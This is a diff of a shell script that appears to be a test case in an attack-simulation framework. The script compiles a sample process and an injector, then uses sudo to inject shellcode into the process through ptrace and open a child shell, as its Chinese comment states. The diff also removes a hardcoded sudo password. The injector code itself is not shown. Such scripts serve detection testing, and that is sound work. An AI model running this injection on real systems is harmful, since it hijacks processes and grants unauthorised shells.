@@ -1,21 +1,22 @@
 ;
-#nohup
-cd /home/ubuntu/attack/linux-process-injection/sample-process
+#pre
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install zip gcc tmux) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip gcc tmux))'
+cd /tmp
+unzip linux-process-injection.zip
+cd linux-process-injection/sample-process
 gcc -o sample sample.c
 tmux new-session -d -s my_session "./sample"
-#pre
-cd /home/ubuntu/attack/linux-process-injection
+cd ..
 gcc -o inject inject.c
 #check
 pid=$(pgrep sample)
-echo '010404' | sudo -S /home/ubuntu/attack/linux-process-injection/inject $pid
+echo '%password%' | sudo -S /tmp/linux-process-injection/inject $pid
 tmux send-keys -t my_session:0 "ls -al" Enter
 echo "利用ptrace系统调用将shellcode注入sample进程(pid:$pid)，shellcode执行将打开子shell，在该shell中执行命令："
 tmux capture-pane -t my_session:0
 tmux show-buffer | sed '/^$/d'
 #clean
-cd /home/ubuntu/attack/linux-process-injection
-rm inject
-cd sample-process
-rm sample
+cd /tmp
 tmux kill-session -t my_session
+rm -rf linux-process-injection
+rm linux-process-injection.zip
